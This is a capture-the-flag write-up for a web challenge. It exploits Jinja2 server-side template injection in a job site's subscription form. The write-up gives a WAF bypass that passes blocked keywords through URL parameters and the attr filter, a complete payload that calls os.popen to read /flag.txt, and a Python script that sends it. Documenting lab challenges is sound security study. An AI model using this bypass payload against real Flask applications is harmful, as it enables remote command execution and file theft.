# JobSeeker

**Category:** Web Exploitation
**Points:** 1000
**Description** Looking for a job? This site seems like the perfect place, if you can find a way to make it work in your favor. Time to put your skills to the test!

## Solution

### Step 1: Initial Reconnaissance

The target is a job listing landing page. The primary interactive element is a subscription form that takes a `name` and `email`.

Upon submitting the form, a POST request is sent to `/abonohu`. The name provided is reflected in the success message:
`Faleminderit që u abonuat [NAME], do të merrni një njoftim kur të lansohet produkti!`

Testing for SSTI by submitting `{{7*7}}` in the `name` field resulted in the output:
`Faleminderit që u abonuat 49...`

This confirmed the presence of SSTI.

### Step 2: Vulnerability Analysis

Further testing revealed that the WAF blocks:

- Strings containing underscores (e.g., `__class__`).
- Built-in Python module names (e.g., `os`).
- Execution-related keywords (e.g., `popen`, `system`).
- Common Jinja2 syntax like `.application` or `.init`.

### Step 3: Exploit Development (WAF Bypass)

To bypass the WAF, I utilized two main techniques:

#### 1. Indirect Access via `request.args`

I passed the blocked keywords as GET parameters in the URL rather than the POST body. For example:
`POST /abonohu?m=from_object&g=__globals__`

Within the template, I accessed these via `request.args.m` and `request.args.g`.

#### 2. Attribute Access via `|attr()`

Since dot notation was partially blocked, I used the `|attr()` filter to access methods by name.

#### 3. Module Leakage

I searched for the `os` module within the available Flask objects. The `config` object's `from_object` method is a rich source of global references:
`{{ config|attr(request.args.m)|attr(request.args.g) }}`

Testing this revealed that `os` was directly available in the globals of `from_object`.

#### Full Payload Construction

The final payload combined these techniques to call `os.popen('cat /flag.txt').read()`:

```jinja
{{ (config[request.args.m][request.args.g][request.args.os]|attr(request.args.p))(request.args.c)|attr(request.args.r)() }}
```

With parameters:

- `m=from_object`
- `g=__globals__`
- `os=os`
- `p=popen`
- `r=read`
- `c=cat /flag.txt`

### Step 4: Capturing the Flag

Executing the payload using a Python script provided the flag.

```python
import requests
import html

target = "https://mnbvcxzasdfghjklz-csc26.cybersecuritychallenge.al/abonohu"
params = {
    "m": "from_object", "g": "__globals__", "os": "os",
    "p": "popen", "r": "read", "c": "cat /flag.txt"
}
payload = "{{ (config[request.args.m][request.args.g][request.args.os]|attr(request.args.p))(request.args.c)|attr(request.args.r)() }}"

resp = requests.post(target, data={"name": payload, "email": "a@b.com"}, params=params)
print(html.unescape(resp.text))
```

**Output:**
`Faleminderit që u abonuat CSC26{s3cur3_g4t3w4y_byp4ss}, do të merrni një njoftim kur të lansohet produkti!`
